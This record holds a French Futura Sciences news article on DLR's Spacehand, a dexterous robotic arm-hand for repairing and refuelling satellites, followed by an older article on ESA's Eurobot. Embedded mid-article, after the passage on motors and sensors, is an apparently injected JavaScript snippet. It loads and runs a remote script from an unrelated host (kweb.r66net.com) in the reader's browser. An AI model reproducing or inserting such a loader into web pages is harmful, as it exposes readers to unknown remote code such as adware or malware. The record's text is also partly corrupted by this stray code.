{"title": "Spacehand : une main robotique dans l'espace", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "09/11/2017", "content": "Les bras robotiques spatiaux de demain ne seront plus seulement cantonnés à des tâches de maintenance ou de récupération d'échantillons extraterrestres. La Spacehand, du Centre allemand pour l'aéronautique et l'astronautique (DLR), pourra ainsi réparer et construire des satellites. Le point avec Maxime Chalon, responsable du projet. Ce qu'il faut retenir Le Centre allemand pour l'aéronautique et l’astronautique (DLR) a présenté la Spacehand, un système bras-main anthropomorphe pour assister les astronautes et les décharger de certaines tâches.  Cette main robotique est dotée d'une incroyable dextérité et est plus performante que la main humaine.  Cela représente un saut technologique significatif par rapport aux bras robotiques spatiaux en service aujourd'hui. Un bras robotique pour les astronautes                       Avec ses nombreux mouvements possibles, le bras robotique mis au point par DLR pourra effectuer des tâches complexes, sur Terre ou dans l'espace. Il se commande par programmation ou bien, comme on le voit ici, en reproduisant les mouvements d'un humain.                                       Aujourd'hui, les agences spatiales travaillent sur des concepts de bras-mains anthropomorphes avec des capacités supérieures à celles des mains humaines. Un de ces projets est sur le point d'aboutir. En effet, il y a quelques semaines, le Centre allemand pour l'aéronautique et l'astronautique (DLR) a profité du salon professionnel dédié aux technologies spatiales,  Space Tech Expo & Conference , pour présenter un «  système de bras-main anthropomorphe extrêmement robuste, développé au centre de  robotique  et de mécatronique de DLR  », nous explique Maxime Chalon, responsable du  projet Spacehand  au DLR.  Ce système robotique est développé dans le cadre de la mission RSGS ( Robotic Servicing of Geosynchronous Satellites ), de la Darpa (ce satellite, dont le lancement est prévu au début des années 2020, doit «  démontrer sa capacité à ravitailler et réparer un satellite en orbite géostationnaire  »). Il préfigure de futurs services aux satellites en orbite liés à la maintenance, comme le  ravitaillement en ergols , la réparation des incidents mécaniques, l'installation de charge utile additionnelle et la possibilité d'améliorer des fonctions existantes. Au premier coup d'œil, il est possible de s'apercevoir de la complexité du système. Avec  « plus de 7 + 12 moteurs et 100 capteurs, il est capable d'une très grande dextérité et d'interagir avec douceur » . Un nombre aussi important de capteurs peut surprendre mais c'est une nécessité pour «  intervenir sur des satellites dont les structures et les équipements sont très fragiles  ».  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Un maximum de liberté Ce système a, dans chacun de ses axes,  « des moteurs avec des capteurs de couple qui font que le bras se comporte comme un ressort virtuel  ». Concrètement, il est possible, «  tout comme peut le faire l'être humain  », d'ajuster la rigidité des «  doigts afin de s'adapter au mieux aux tâches à effectuer  ». Chacune des articulations a ses propres capteurs de couple, qui vont «  permettre à la main de se comporter doucement  ». Concrètement, avec ces capteurs, si un opérateur demande à la main de serrer un objet,  « elle pourra le faire et s'arrêtera si l'effort est suffisant  ». Autre exemple : si, par erreur, on lui demande d'aller au niveau de quelque chose, elle va «  simplement s'appuyer contre et s'arrêter afin de ne pas endommager ce qui est touché  ». La forme tarabiscotée du bras s'explique par le besoin «  d'avoir un maximum de degré de liberté  ». Avec 7° de liberté (12° pour la main), ce bras a la liberté de mouvement qui lui permet de se «  placer librement dans son environnement et de tourner autour d'un point  ». Avec un degré de mouvement moindre, le bras aurait eu des «  difficultés pour accéder à tous les endroits qui l'entourent  ». Cette forme a aussi été pensée pour éviter que «  les utilisateurs du bras se coincent ou se coupent des doigts  ». À gauche, la Spacehand du DLR, et, à droite, Dextre, de l'Agence spatiale canadienne, installé sur l'ISS. Plusieurs décennies séparent ces deux bras. © Rémy Decourt et Nasa                               Changement d'époque par rapport au bras de l'ISS Pour opérer avec ce système de bras-main anthropomorphe, «  deux options sont possibles en fonction des communications  » : Avec un lien direct, le temps de latence est très réduit et «  nous permet de télémanipuler  » la Spacehand. Cela ne sera pas possible si le «  lien avec le sol et le système n'est pas direct  ». Dans ce cas, la Spacehand pourra fonctionner avec une certaine autonomie. Ce système offre «  plus de dextérité que le bras robotique Canadarm 2, de la  Station spatiale internationale  ( ISS )  ». Canadarm 2 a surtout été conçu pour l'assemblage et l'entretien de l'ISS. Il est essentiellement utilisé pour le déplacement et le port de charges lourdes comme des équipements, des instruments et des modules. Il n'est donc pas conçu pour interagir avec la Station comme pourrait le faire la Spacehand.  Dextre , le manipulateur agile spécialisé du bras et de conception plus récente que le Canadarm 2, s'approche du concept mais ses «  capacités d'interaction avec le complexe orbital sont très en deçà de notre Spacehand  », qui pousse le concept au «  maximum de l'état de l'art de nos connaissances  », estime Maxime Chalon. Au-delà de cette mission de démonstration, ce système bras-main anthropomorphe pourra être adapté à d'autres utilisations spatiales. On pense aux activités humaines en orbite basse ou dans l' espace profond , de façon à restreindre les sorties des  astronautes . La Spacehand pourra être utilisée pour «  réaliser tout un tas de tâches qui ne nécessitent pas vraiment d'humains, comme, par exemple, retirer et remplacer des couvertures thermiques  ». Pour en savoir plus Le robot dansant de l'Agence spatiale européenne Article de Rémy Decourt publié le 08/03/2011 Il fallait bien un  robot  danseur pour ce Mois de la robotique, et celui-là, baptisé Eurobot, a été imaginé pour se promener dans le vide de l'espace... En 2007, l' Agence spatiale européenne  et Thales Alenia Space cherchaient à mettre au point une sorte d'assistance robotique aux sorties extravéhiculaires des astronautes humains. Le projet n'a pas abouti mais se poursuit sous d'autres formes, pour des missions sans hommes. Dans la course à la  robotique , l'Esa n'est pas en reste.  Eurobot , c'est son nom, est un programme lancé en 2002 qui avait pour objectif de démontrer la faisabilité d'un assistant robotique pour appuyer les astronautes pendant leurs sorties extravéhiculaires (EVA). Ce programme avait débouché sur un démonstrateur attestant ses capacités lors d'une série d'essais et de tests simulant des sorties dans l'espace, à l'extérieur de l'ISS.  Ce système robotique était constitué de trois bras et d'une structure, l' exosquelette , qui devait permettre aux astronautes de le commander en recourant aux techniques de la  réalité virtuelle . Ces bras étaient conçus autant pour se déplacer que pour des tâches variées : débarrasser les astronautes de leurs outils, ouvrir et fermer des caisses, se charger du rangement à l'issue de l'EVA et remettre à leur place les objets utilisés. Bénéficiant d’une très grande autonomie et doté de performances remarquables, ce robot ne pouvait cependant réaliser que ce qu’il avait appris à faire. Après les bras télémanipulateurs de la Station (Canadarm2, celui de Kibo, le futur bras européen Era), Eurobot est une des étapes menant à la mise au point d’une intelligence artificielle. © H. Rub, ESA                               Bien qu'il ressemble aux bras robotiques en service aujourd'hui sur l'ISS, qu'il serait plus judicieux d'appeler télémanipulateur, son concept est très différent.  Canadarm2  comme le bras du Japon ont l'inconvénient d'être fixes et de se déplacer seulement d'un point fixe à un autre.  Eurobot , lui, a été conçu pour s'affranchir de cette contrainte de façon à de se déplacer sur toute la surface extérieure de la Station en s'agrippant à des mains courantes, que l'on trouve en grand nombre sur les modules de l'ISS. Un centaure européen pour l'espace Malgré des tests réussis en piscine, ce  robot  ne sera jamais utilisé sur la Station. Cependant, le travail réalisé n'est pas pour autant perdu. En 2008, l'Esa a engagé une nouvelle phase du programme en finançant le projet d'assistant robotique de surface EGP ( Eurobot Ground Prototype ).  Cette fois, l'idée est d'étendre les capacités des  robots  au-delà de leur utilisation sur la Station dans le cadre de possibles scénarios d'exploration du  Système solaire  par des missions habitées. Le nouveau système robotique est conçu pour être exploité à la surface d'une planète, pour préparer l'atterrissage des astronautes puis pour soutenir leurs activités après leur débarquement. ", "theme": "sciences"}